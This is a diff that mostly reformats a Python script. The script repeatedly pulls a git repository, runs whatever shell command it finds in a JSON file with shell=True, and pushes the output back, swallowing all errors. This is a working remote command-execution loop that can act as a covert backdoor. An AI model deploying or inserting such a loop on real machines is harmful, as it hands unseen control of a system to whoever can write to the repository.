@@ -8,11 +8,11 @@ last_id = ""
 
 while True:
     try:
-        # Pull latest changes from GitHub
         os.system(f'cd "{REPO}" && git pull --quiet 2>/dev/null')
 
         with open(PENDING) as f:
             data = json.load(f)
+
         cmd_id = data.get("id", "")
         command = data.get("command", "")
 
@@ -20,21 +20,24 @@ while True:
             last_id = cmd_id
             try:
                 out = subprocess.check_output(
-                    command, shell=True, stderr=subprocess.STDOUT, timeout=30,
-                    cwd=REPO
+                    command, shell=True, stderr=subprocess.STDOUT,
+                    timeout=30, cwd=REPO
                 )
                 result = out.decode("utf-8", errors="replace")
             except subprocess.CalledProcessError as e:
-                result = f"ERROR:\n{e.output.decode('utf-8', errors='replace')}"
+                result = "ERROR:\n" + e.output.decode("utf-8", errors="replace")
             except subprocess.TimeoutExpired:
                 result = "ERROR: Command timed out"
 
             with open(RESULT, "w") as f:
-                json.dump({"id": cmd_id, "result": result}, f, ensure_ascii=False, indent=2)
+                json.dump({"id": cmd_id, "result": result}, f,
+                          ensure_ascii=False, indent=2)
 
             os.system(
-                f'cd "{REPO}" && git add cmds/result.json && '
-                f'git commit -m "result {cmd_id}" && git push --quiet 2>/dev/null'
+                f'cd "{REPO}" && '
+                f'git add cmds/result.json && '
+                f'git commit -m "result {cmd_id}" && '
+                f'git push --quiet 2>/dev/null'
             )
     except Exception:
         pass
